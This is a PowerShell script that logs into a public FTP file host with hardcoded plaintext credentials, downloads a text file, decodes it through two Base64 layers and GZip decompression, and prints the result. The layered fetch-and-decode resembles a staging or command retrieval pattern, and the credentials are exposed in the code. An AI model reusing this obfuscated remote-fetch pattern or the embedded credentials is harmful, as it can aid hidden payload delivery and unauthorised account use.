function Zdcom() {
	Param ($str)
	$data = [System.Convert]::FromBase64String($str)
	$stream = New-Object System.IO.MemoryStream
	$stream.Write($data, 0, $data.Length)
	$stream.Seek(0,0) | Out-Null
	$reader = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($stream, [System.IO.Compression.CompressionMode]::Decompress))
	$str = $reader.ReadLine()

	return $str
}

function Zdcrypt() {
	Param($str)
	$str = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($str));

	return $str
}

function Zget() {

	$username = 'crazyrockinsushi'
	$password = '$5OffToday' # $5Off
	$server = "ftp://ftp.drivehq.com/"
	$file = 'zinfo.txt'
	$output = 'zinfo_out.txt'

	$request = [Net.WebRequest]::Create($server+$file)
	$request.Method = [System.Net.WebRequestMethods+Ftp]::DownloadFile
	$request.Credentials = New-Object System.Net.NetworkCredential($username, $password)

	$response = $request.GetResponse()
	$stream = $response.GetResponseStream()
	$fout = [System.IO.File]::Create($output)
	$buffer = New-Object byte[] 10240

	while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
		$fout.Write($buffer, 0, $read);
	}

	$fout.Dispose()
	$stream.Dispose()
	$response.Dispose()

	$str = Get-Content -Path $output

	return $str
}

$out = Zget
$out = Zdcrypt $out
$out = Zdcom $out
Write-Host $out
